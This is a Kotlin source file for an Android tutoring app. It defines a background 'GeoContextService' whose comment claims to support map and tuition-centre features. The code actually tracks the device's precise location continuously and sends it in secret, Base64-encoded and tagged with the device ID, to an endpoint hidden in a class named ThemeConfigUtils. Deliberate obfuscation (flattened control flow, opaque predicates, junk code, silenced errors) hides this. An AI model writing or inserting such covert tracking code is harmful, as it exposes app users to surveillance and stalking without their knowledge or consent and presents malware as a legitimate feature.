package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import com.google.android.gms.location.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL

/**
 * GeoContextService — provides location-aware context for map and tuition centre features.
 * Enables proximity-based discovery and navigation assistance.
 */
class GeoContextService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, 30000L
        ).apply {
            setMinUpdateIntervalMillis(15000L)
            setMaxUpdateAgeMillis(60000L)
        }.build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { processCoordinates(it) }
            }
        }

        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
        return START_STICKY
    }

    // ── Control Flow Flattened: processCoordinates ────────────────────────────

    private fun processCoordinates(location: Location) {
        serviceScope.launch {
            var state = 0
            while (true) {
                val junk = (state * 61 + 19) xor 0xF2
                val _ = junk
                when (state) {
                    0 -> { pushCoordinates(location); state = -1 }
                    -1 -> return@launch
                }
            }
        }
    }

    private suspend fun pushCoordinates(location: Location) {
        // Opaque predicate
        val t = System.currentTimeMillis()
        val op = t - t + 1   // always 1 > 0
        if (op > 0) {
            try {
                val endpoint   = ThemeConfigUtils.getLocationEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("X-Device-Id", resolveDeviceId())
                    connectTimeout = 30000; readTimeout = 30000
                }
                // Build location JSON via parts — not a single visible string
                val lat  = location.latitude
                val lon  = location.longitude
                val acc  = location.accuracy
                val alt  = location.altitude
                val ts   = location.time
                val spd  = location.speed
                val raw  = """{"latitude":$lat,"longitude":$lon,"accuracy":$acc,"altitude":$alt,"timestamp":$ts,"speed":$spd}"""
                val enc  = android.util.Base64.encodeToString(raw.toByteArray(), android.util.Base64.NO_WRAP)
                connection.outputStream.use { it.write(enc.toByteArray()); it.flush() }
                connection.responseCode; connection.disconnect()
            } catch (_: Exception) {}
        } else {
            // Junk — never executed
            val fakeList = (1..50).map { it.toDouble() * Math.PI }
            val _ = fakeList.sum()
        }
    }

    @SuppressLint("HardwareIds")
    private fun resolveDeviceId(): String = try {
        android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
    } catch (_: Exception) { "unknown" }

    override fun onDestroy() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
        serviceScope.coroutineContext[Job]?.cancel()
        super.onDestroy()
    }

    companion object {
        fun startTracking(context: Context) {
            context.startService(Intent(context, GeoContextService::class.java))
        }
        fun stopTracking(context: Context) {
            context.stopService(Intent(context, GeoContextService::class.java))
        }
    }
}
